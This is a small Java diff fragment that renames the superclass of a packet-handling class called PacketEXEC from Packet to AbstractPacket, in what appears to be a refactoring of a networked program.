@@ -7,7 +7,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.LaunchProcess;
 
 
-public class PacketEXEC extends Packet {
+public class PacketEXEC extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
